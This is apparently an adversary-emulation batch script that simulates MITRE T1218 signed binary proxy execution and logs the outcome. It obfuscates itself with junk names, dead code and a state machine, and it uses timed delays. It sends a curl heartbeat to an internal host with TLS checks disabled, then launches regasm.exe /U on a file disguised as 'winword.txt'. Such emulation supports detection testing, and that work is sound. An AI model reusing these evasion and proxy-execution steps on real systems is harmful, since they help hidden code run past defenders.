@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\7777\61ebbc52
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7777-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=winword.txt
SET dvhhyc=7777

REM Internal random variables
SET zxddff=0
SET qwmnbv=1
SET asdfgh=0
SET zxcvbn=1
SET lkjhgf=0
SET poiuyy=1
SET mnhgfd=0

SET logfile=!APPDATA!\!rrocubc!\macula-simulations.log
IF NOT EXIST "!APPDATA!\!rrocubc!\" mkdir "!APPDATA!\!rrocubc!"

REM Start delay
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_start>>> "!logfile!" 2>nul
timeout /t 35 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete>>> "!logfile!" 2>nul

GOTO vbnzxc

:dead_akjdh
REM Never executed dead code
SET fakevar=never_used
GOTO dead_ghjkl

:dead_ghjkl
REM More dead code
IF 0==1 GOTO real_code
EXIT

:real_code
REM This is also dead
GOTO END

:vbnzxc
REM Start state machine
SET state=0
GOTO dispatch_qwe

:dispatch_qwe
IF !state!==0 GOTO init_rtz
IF !state!==13 GOTO check_opl
IF !state!==27 GOTO dir_mnb
IF !state!==44 GOTO exec_klj
IF !state!==99 GOTO END
GOTO dead_ghjkl

:junk_yuio
REM Fake conditional branch
IF 1==1 (
    SET trash=data
) ELSE (
    GOTO dead_akjdh
)
GOTO dispatch_qwe

:init_rtz
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: setup_complete>>> "!logfile!" 2>nul
ping -n 8 127.0.0.1 >nul
SET state=13
GOTO dispatch_qwe

:check_opl
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>>> "!logfile!" 2>nul
curl -k -s -o nul "!keghkgto!"
SET check_result=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete=!check_result!>>> "!logfile!" 2>nul

IF !check_result!==0 (
    SET ttp_result=1
    SET ttp_error=
) ELSE (
    SET ttp_result=0
    SET ttp_error=connection_failed
)

REM Build TTP timestamp
FOR /F "tokens=1-3 delims=./ " %%a in ('echo !DATE!') do SET dd=%%a&SET mm=%%b&SET yyyy=%%c
SET hh=!TIME:~0,2!
SET nn=!TIME:~3,2!
SET ss=!TIME:~6,2!
SET ms=!TIME:~9,3!
IF "!hh:~0,1!"==" " SET hh=0!hh:~1!
SET ttp_timestamp=!yyyy!-!mm!-!dd! !hh!:!nn!:!ss!.!ms!

echo [!ttp_timestamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Binary_Proxy_Execution:_Regsvcs/Regasm=!ttp_result!:!ttp_error!>> "!logfile!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul
SET state=27
GOTO dispatch_qwe

:dir_mnb
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>>> "!logfile!" 2>nul
cd /d "!txisnba!"
SET chdir_result=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_complete=!chdir_result!>>> "!logfile!" 2>nul

SET /A rnd_delay=%RANDOM% %% 20 + 10
timeout /t !rnd_delay! /nobreak >nul

SET state=44
GOTO dispatch_qwe

:exec_klj
REM Execute regasm.exe with /U
SET regasm_path=C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe
IF NOT EXIST "!regasm_path!" SET regasm_path=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_exec_start=!xzanpex!>>> "!logfile!" 2>nul
"!regasm_path!" /U "!xzanpex!"
SET exec_result=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_exec_complete=!exec_result!>>> "!logfile!" 2>nul

REM Final TTP logging
IF !exec_result!==0 (
    SET ttp_result_final=1
    SET ttp_error_final=
) ELSE (
    SET ttp_result_final=0
    SET ttp_error_final=execution_failed
)

FOR /F "tokens=1-3 delims=./ " %%a in ('echo !DATE!') do SET dd2=%%a&SET mm2=%%b&SET yyyy2=%%c
SET hh2=!TIME:~0,2!
SET nn2=!TIME:~3,2!
SET ss2=!TIME:~6,2!
SET ms2=!TIME:~9,3!
IF "!hh2:~0,1!"==" " SET hh2=0!hh2:~1!
SET ttp_timestamp2=!yyyy2!-!mm2!-!dd2! !hh2!:!nn2!:!ss2!.!ms2!

echo [!ttp_timestamp2!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Binary_Proxy_Execution:_Regsvcs/Regasm=!ttp_result_final!:!ttp_error_final!>> "!logfile!" 2>nul

timeout /t 5 /nobreak >nul
SET state=99
GOTO dispatch_qwe

:dead_uiop
REM Unreachable code block
SET dummy=value
IF !dummy!==value GOTO dead_akjdh
GOTO END

:END
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_complete>>> "!logfile!" 2>nul
EXIT /B 0